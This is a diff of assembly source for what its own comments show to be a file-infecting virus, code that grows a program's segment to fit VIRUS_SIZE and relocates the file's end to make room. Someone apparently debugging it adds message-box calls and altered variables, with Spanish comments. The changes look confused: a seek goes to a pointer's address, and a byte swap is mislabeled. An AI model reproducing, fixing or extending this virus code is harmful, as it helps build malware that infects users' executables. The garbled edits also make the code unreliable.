@@ -336,6 +336,7 @@ FILE_OK:
         ;mov edx,DWORD[NEW_HDR+16H] ;get initial cs
 
        call GET_SEG_ENTRY ;and read seg table entry into disk buf
+          invoke MessageBoxA, 0, next_msg, notify_msg, MB_OK       ;malo aqui
 
         mov eax,DWORD [TEMP+2] ;put segment length in ax
         add eax,VIRUS_SIZE ;add size of virus to it
@@ -506,42 +507,57 @@ US4: mov dword[TEMP],eax ;adjust segment loc in memory
  ret ;all done
 ;This routine goes to the segment table entry number specified in dx in the
 ;file and reads it into the TEMP buffer. dx=1 is the first entry!
-GET_SEG_ENTRY:
+ GET_SEG_ENTRY:
 
- push ebx
- push esi
- push edi
-
-
-; dec edx
-; mov cl,3
-; shl edx,cl
- mov edx,dword[NH_OFFSET]
-
- add edx,dword[NEW_HDR+22H] ;dx=ofs of seg table entry requested
- mov ecx,edx
-
-; call FILE_SEEK_ST ;go to specified table entry
- invoke fseek, [fileHandle],ecx, 0
+  push ebx
+  push esi
+  push edi
 
 
+ ; dec edx
+ ; mov cl,3
+ ; shl edx,cl
+  ; Mover contenido de NH_OFFSET a edx
+    ; Mover contenido de NH_OFFSET2 a EDX
+       ; Mostrar el contenido de NH_OFFSET2 en un MessageBox
+    mov edx, NH_OFFSET
+    invoke MessageBoxA, 0, edx, notify_msg, MB_OK
 
- jc SHORT GSE1 ;exit on error
- mov edx,TEMP
+    ; Intercambiar los valores de NH_OFFSET y NH_OFFSET2
+    mov al, byte[table_entry_number ]
+    mov bl, byte[NH_OFFSET]
+    add bl,22h
+    mov byte[table_entry_number], bl
 
- mov ebx,dword[fileHandle]
- mov edi, edx
-; xor ecx,ecx
-; mov cl,8
-  mov ecx,8
- call FILE_READ ;read table entry into disk buf
+    mov byte[NH_OFFSET], al
+
+    ; Mostrar el contenido de NH_OFFSET2 nuevamente en un MessageBox
+    mov edx, table_entry_number
+    invoke MessageBoxA, 0, edx, notify_msg, MB_OK
+
+    mov ecx,edx
+
+   ; call FILE_SEEK_ST ;go to specified table entry
+   invoke fseek, [fileHandle],ecx, 0
 
 
-GSE1:
- POP ebx
- POP esi
- POP edi
-ret
+
+   jc SHORT GSE1 ;exit on error
+   mov edx,TEMP
+
+   mov ebx,dword[fileHandle]
+   mov edi, edx
+  ; xor ecx,ecx
+  ; mov cl,8
+   mov ecx,8
+  call FILE_READ ;read table entry into disk buf
+
+
+  GSE1:
+   POP ebx
+   POP esi
+   POP edi
+  ret
 ;This routine moves the end of the virus out by VIRSECS. The “end” is
 ;everything after the initial code segment where the virus will live.
 ;The variable VIRSECS is assumed to be properly set up before this is called.
@@ -1011,7 +1027,8 @@ KNAME DB 6 dup (?) ;"KERNEL"
 FILE_NAME DB 13 dup (?) ;file name
 VSTART DD ? ;starting offset of virus in ram
 ENTRYPT DD ? ;initial ip of virus start
-NH_OFFSET DD ? ;new hdr offs from start of file
+NH_OFFSET db "b",0,0,0 ;new hdr offs from start of file
+table_entry_number db "a",0,0,0 ; Definimos NH_OFFSET como una cadena que contiene un solo caracter 'a'
 VIRSECS DD ? ;secs added to file for virus
 INITSEC DD ? ;init cs loc in file (sectors)
 RELOCS DD ? ;number of relocatables in cs
